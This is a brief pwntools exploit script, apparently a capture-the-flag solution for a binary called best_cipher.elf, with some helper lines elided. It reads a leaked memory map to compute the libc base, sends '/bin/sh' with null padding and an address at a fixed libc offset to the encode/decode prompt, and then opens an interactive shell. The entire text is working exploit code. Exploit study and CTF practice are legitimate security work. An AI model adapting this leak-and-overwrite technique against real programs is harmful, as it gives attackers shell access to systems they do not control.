...
exe = context.binary = ELF('./best_cipher.elf')
...
io = start()
leak = io.recvuntil(b'>').decode()
LIBC_base = int(re.findall(r"([0-9a-f]+)\-[0-9a-f]+.*libc-2", leak)[0], 16)
io.sendline('1')
io.recvuntil('Enter string to encode/decode: ')
io.sendline(b'/bin/sh' + 49 * b'\x00' + p64(LIBC_base + 0x48F20))
io.interactive()